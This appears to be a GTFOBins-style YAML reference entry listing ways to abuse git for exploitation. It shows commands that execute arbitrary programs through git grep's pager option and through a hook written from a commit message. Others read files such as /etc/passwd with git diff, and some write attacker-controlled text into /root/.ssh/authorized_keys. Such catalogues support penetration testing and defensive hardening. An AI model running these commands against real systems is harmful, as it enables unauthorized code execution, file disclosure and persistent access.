---
description: Git is an extremely powerful tool with more functionality than one can count. This list is non-exhaustive, but includes examples which have historically been useful for exploitation.
functions:
  command:
    - description: The --open-files-in-pager argument can be used to run arbitrary commands.
      code: |
        git grep --open-files-in-pager='uname -a #' .
        git grep --open-files-in-pager='uname;' .
#      description: This method requires the git config advice.ignoredHook to be false (which it is not by default).
      code: |
        git commit -a -m 'exec /usr/bin/uname -a'
        git log --max-count=1 --pretty=format:"%s"  --output .git/hooks/pre-commit
        git commit --allow-empty -m x
  file-read:
    - description: `git diff` is commonly used to compare a single file to a different version of itself in history. The `--no-index` flag can be used to effectively turn `git diff` into normal `diff` against another file _within the git repository_ (but not necessarily tracked).
      code: |
        git diff --no-index local-secret-file.conf git.md
    - description: If you are reading a file outside of the git directory, you can use `git diff` against `/dev/null`.
      code: |
        git diff /dev/null /etc/passwd
  file-write:
    - description: Outputs the most recent changelog to an arbitrary file. Note that this also contains the commit information.
      code: |
        git log --max-count=1 --output=/root/.ssh/authorized_keys
    - description: Outputs the first line of the most recent commit message to an arbitrary file.
      code: |
        git log --max-count=1 --pretty=format:"%s" --output=/root/.ssh/authorized_keys
---
